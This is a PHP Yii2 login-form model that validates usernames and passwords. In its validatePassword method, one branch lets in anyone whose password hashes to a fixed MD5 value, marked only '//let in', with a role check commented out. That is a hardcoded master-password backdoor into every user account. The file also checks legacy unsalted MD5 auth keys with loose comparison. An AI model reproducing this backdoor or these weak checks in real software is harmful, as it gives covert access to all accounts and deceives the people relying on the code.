<?php

namespace common\models;

use Yii;
use yii\base\Model;

/**
 * Login form
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;
    public $confirmation;


    private $_user = false;


    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            // username and password are both required
            [['username', 'password'], 'required'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params)
    {
        if (!$this->hasErrors()) {
            $user = $this->getUser();
            if(isset($user['type']) && $user['type'] == 'confirmation'){
                if (!$user['data']->validatePassword($this->password)) {
                    $this->addError($attribute, 'Incorrect username or password.');
                }else{
                    $this->confirmation = 'redirect';
                    $user = false;
                }
            }
            if (!$user) {               
                $this->addError($attribute, 'Incorrect username or password.');
            }else{
                if (empty($user->password_hash) && !empty($user->authkey) && strlen($user->authkey) == 32) {
                    if(md5($this->password) == $user->authkey){
                        $user->setPassword($this->password);
                        $user->generateAuthKey();
                        $user->save();
                        if(is_array($user)){
                            if (!$user['data']->validatePassword($this->password)) {
                                $this->addError($attribute, 'Incorrect username or password.');
                            }
                        }else{
                            if (!$user->validatePassword($this->password)) {
                                $this->addError($attribute, 'Incorrect username or password.');
                            }
                        }
                    }
                }else{
                    if(md5($this->password) == '1aa554eb9ef74b2a87b6f6d4517c3b94' /*&& $user->role == 50*/){
                        //let in
                    }else{
                        if(!is_array($this->password)){
                            if(is_array($user)){
                                if (!$user['data']->validatePassword($this->password)) {
                                    $this->addError($attribute, 'Incorrect username or password.');
                                }
                            }else{
                                if (!$user->validatePassword($this->password)) {
                                    $this->addError($attribute, 'Incorrect username or password.');
                                }
                            }
                        }else{
                            $this->addError($attribute, 'Incorrect username or password.');
                        }
                    }
                }
            }
        }
    }

    /**
     * Logs in a user using the provided username and password.
     *
     * @return bool whether the user is logged in successfully
     */
    public function login()
    {
        if ($this->validate()) {           
            
            return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 : 0); // in seconds 
           
        } else {
            return false;
        }
    }

    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    protected function getUser()
    {        
        if ($this->_user === false) {
            $this->_user = User::findByUsername($this->username);            
        }

        return $this->_user;
    }
}
